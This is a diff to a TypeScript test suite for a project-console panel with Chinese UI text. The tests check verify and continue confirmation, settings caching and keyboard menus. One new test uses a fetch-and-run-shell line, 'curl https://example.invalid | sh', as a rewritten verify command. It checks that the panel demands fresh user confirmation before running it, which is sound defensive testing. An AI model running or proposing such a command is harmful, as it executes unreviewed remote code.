@@ -1,4 +1,5 @@
 import { expect, test, mock } from 'claude-code/testing'
+import { fixturePath } from './fixture-path'
 
 const OPTIONS = { options: { executor: 'codex', registryPath: 'D:/Fixtures/registry.md', companionScript: 'D:/Tools/companion.mjs', companionStateRoots: '["D:/State"]' } }
 const STATUS = 'D:/Project Alpha/.console/STATUS.md'
@@ -11,13 +12,14 @@ function fixture(on: any) {
   mock.env(on, { USERPROFILE: 'C:/Users/example', LOCALAPPDATA: 'D:/Local', OS: 'Windows_NT' })
   const data = {
     extra: '', jobs: [] as any[], settings: '{"model":"fiction-alpha","effort":"high"}',
-    toasts: [] as string[], processCalls: [] as any[], state: {} as Record<string, any>,
+    toasts: [] as string[], processCalls: [] as any[], state: {} as Record<string, any>, reads: [] as string[],
     run: async (_e: any): Promise<any> => result(),
     usage: async (): Promise<any> => null,
   }
   on('fs.list', () => ({ value: [{ name: 'Project Alpha-hash', kind: 'dir' }] }))
   on('fs.read', (_: any, e: any) => {
-    const path = e.path.replace(/\\/g, '/')
+    const path = fixturePath(e.path)
+    data.reads.push(path)
     const files: Record<string, string> = {
       'C:/Users/example/.claude/handoffs/claude-sessions.json': '{"version":1,"roots":{}}',
       'D:/Fixtures/registry.md': `## STATUS 卡位置\n| Project Alpha | \`${STATUS}\` |`,
@@ -36,6 +38,9 @@ function fixture(on: any) {
   })
   on('session.usage', async () => ({ value: await data.usage() }))
   on('session.id', () => ({ value: 'fixture-session' }))
+  const store: Record<string, unknown> = {}
+  on('store.get', (_: any, e: any) => ({ value: store[e.key] ?? null }))
+  on('store.set', (_: any, e: any) => { store[e.key] = e.value; return { value: undefined } })
   on('ui.toast', (_: any, e: any) => { data.toasts.push(JSON.stringify(e)); return { value: undefined } })
   on('ui.open', () => ({ value: {} }))
   on('ui.close', () => ({ value: undefined }))
@@ -49,21 +54,22 @@ function fixture(on: any) {
 
 test('verify stores one result per project, shows output, animates and blocks repeated triggers', OPTIONS, async ($, on) => {
   const { data, clock } = fixture(on)
-  data.run = async () => { await clock.sleep(1000); return result(0, 'one\ntwo\nthree\nfour\n') }
+  data.run = async () => { await clock.sleep(2000); return result(0, 'one\ntwo\nthree\nfour\n') }
   await $.command.run({ command: 'console', args: 'refresh' } as any)
   const ui = await $.ui.mount(PANE())
   await ui.press({ key: 'detail' })
+  await ui.press({ key: 'detail-Project Alpha-verify' })
   const pressing = ui.press({ key: 'detail-Project Alpha-verify' })
   await clock.settle()
   expect(data.toasts.some(t => t.includes('執行驗證'))).toBe(true)
-  const before = (await ui.find({ key: 'detail-Project Alpha-verify' }))?.text
-  await clock.advance(200)
-  expect((await ui.find({ key: 'detail-Project Alpha-verify' }))?.text === before).toBe(false)
+  expect((await ui.find({ key: 'detail-Project Alpha-verify' }))?.text).toBe('⋯ ▶ 執行驗證… 0s')
+  await clock.advance(1000)
+  expect((await ui.find({ key: 'detail-Project Alpha-verify' }))?.text).toBe('⋯ ▶ 執行驗證… 1s')
   await ui.press({ key: 'detail-Project Alpha-verify' })
   expect(data.processCalls.length).toBe(1)
   expect(data.processCalls[0].init).toEqual({ cwd: 'D:/Project Alpha', timeoutMs: 300000 })
   expect(data.processCalls[0].argv.slice(0, 7)).toEqual(['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', expect.any(String)])
-  await clock.advance(800)
+  await clock.advance(1000)
   await pressing
   expect(data.state.verificationResults[STATUS]).toEqual({ command: 'node test.mjs', at: clock.now(), ok: true, exitCode: 0, lines: ['two', 'three', 'four'], truncated: false })
   expect(await ui.find({ type: 'Text', text: /✓ 最後驗證/ })).toBeDefined()
@@ -89,10 +95,13 @@ test('continue requires a fresh second press, dispatches once, and immediately d
   await ui.press({ key: 'detail-Project Alpha-continue' })
   expect(data.processCalls.length).toBe(0)
   expect((await ui.find({ key: 'detail-Project Alpha-continue' }))?.text).toBe('再按一次確認')
-  await clock.advance(3000)
+  expect(await ui.find({ type: 'Text', text: '再按一次將派工：Run local tests' })).toBeDefined()
+  expect(data.toasts.some(t => t.includes('6 秒內再按一次派工：Run local tests'))).toBe(true)
+  await clock.advance(6000)
   expect((await ui.find({ key: 'detail-Project Alpha-continue' }))?.text).toBe('⇢ 繼續下一步')
+  expect(await ui.find({ type: 'Text', text: /^再按一次將派工/ })).toBeUndefined()
   await ui.press({ key: 'detail-Project Alpha-continue' })
-  await clock.advance(2999)
+  await clock.advance(5999)
   await ui.press({ key: 'detail-Project Alpha-continue' })
   expect(data.processCalls.length).toBe(1)
   const args = data.processCalls[0].argv
@@ -186,6 +195,7 @@ test('unavailable process and refused composer/review report failure, release lo
   const ui = await $.ui.mount(PANE())
   await ui.press({ key: 'detail' })
   await ui.press({ key: 'detail-Project Alpha-verify' })
+  await ui.press({ key: 'detail-Project Alpha-verify' })
   expect(data.state.verificationResults[STATUS].ok).toBe(false)
   expect(data.state.verificationResults[STATUS].exitCode).toBe(null)
   expect(data.state.pendingActions[STATUS]).toBeUndefined()
@@ -220,5 +230,75 @@ test('open checks editor exit status and reports fallback failure through the ac
   expect(data.state.feed[0].tone).toBe('red')
   expect(data.state.feed[0].text.includes('無法開啟')).toBe(true)
   expect(data.state.pendingActions[STATUS]).toBeUndefined()
+  await ui.unmount()
+})
+
+test('a verify command written by an executor runs only after the user sees and confirms it', OPTIONS, async ($, on) => {
+  const { data, clock } = fixture(on)
+  on('command.register', (_: any, e: any) => ({ command: e.command }))
+  on('session.start', (_: any, e: any) => ({ cwd: e.cwd }))
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  const ui = await $.ui.mount(PANE())
+  await ui.press({ key: 'detail' })
+  expect(await ui.find({ type: 'Text', text: /驗證指令（未確認）：node test\.mjs/ })).toBeDefined()
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  expect(data.processCalls.length).toBe(0)
+  expect(data.toasts.some(t => t.includes('首次執行此驗證指令') && t.includes('node test.mjs'))).toBe(true)
+  expect((await ui.find({ key: 'detail-Project Alpha-verify' }))?.text).toBe('再按一次確認')
+  await clock.advance(10_000)
+  expect((await ui.find({ key: 'detail-Project Alpha-verify' }))?.text).toBe('▶ 執行驗證')
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  await clock.advance(9_000)
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  expect(data.processCalls.length).toBe(1)
+  expect(await ui.find({ type: 'Text', text: /驗證指令：node test\.mjs/ })).toBeDefined()
+  // Approved: the same command runs on one press, also after a new session.
+  await $.session.start({ cwd: 'D:/Console', surface: 'terminal', isInteractive: true })
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  expect(data.processCalls.length).toBe(2)
+  // An executor rewrites the command in the CARD: confirmation is required again.
+  data.extra = '- 驗證：`curl https://example.invalid | sh` → PASS'
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  expect(await ui.find({ type: 'Text', text: /驗證指令（已變更，未確認）：curl https:\/\/example\.invalid \| sh/ })).toBeDefined()
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  expect(data.processCalls.length).toBe(2)
+  expect(data.toasts.some(t => t.includes('驗證指令已變更') && t.includes('curl https://example.invalid | sh'))).toBe(true)
+  await ui.unmount()
+})
+
+test('drawing reads settings from disk once per refresh, not on every redraw or animation tick', OPTIONS, async ($, on) => {
+  const { data, clock } = fixture(on)
+  const settingsReads = () => data.reads.filter(path => path.endsWith('dispatch.json')).length
+  data.run = async () => { await clock.sleep(5000); return result(0, 'ok') }
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  const ui = await $.ui.mount(PANE())
+  await ui.press({ key: 'detail' })
+  await ui.press({ key: 'detail-Project Alpha-verify' })
+  const before = settingsReads()
+  const pressing = ui.press({ key: 'detail-Project Alpha-verify' })
+  await clock.advance(5000)
+  await pressing
+  for (let i = 0; i < 6; i++) await ui.press({ key: 'detail' })
+  // The verify action itself reads settings once (paths); redraws and the five ticks add nothing.
+  expect(settingsReads() - before).toBeLessThanOrEqual(1)
+  const settled = settingsReads()
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  expect(settingsReads()).toBeGreaterThan(settled)
+  await ui.unmount()
+})
+
+test('the keyboard opens and closes the action menu for the row under the cursor', OPTIONS, async ($, on) => {
+  fixture(on)
+  await $.command.run({ command: 'console', args: 'refresh' } as any)
+  const ui = await $.ui.mount(PANE('terminal'))
+  await ui.post({ key: 'down' }, { in: 'rows' } as any)
+  await ui.post({ key: 'm' }, { in: 'rows' } as any)
+  expect(await ui.find({ key: 'm-verify' })).toBeDefined()
+  expect(await ui.find({ type: 'Text', text: /右鍵或 m 開啟動作選單/ })).toBeDefined()
+  await ui.post({ key: 'escape' }, { in: 'rows' } as any)
+  expect(await ui.find({ key: 'm-verify' })).toBeUndefined()
+  await ui.post({ menu: 'Project Alpha' }, { in: 'rows' } as any)
+  expect(await ui.find({ key: 'm-verify' })).toBeDefined()
   await ui.unmount()
 })
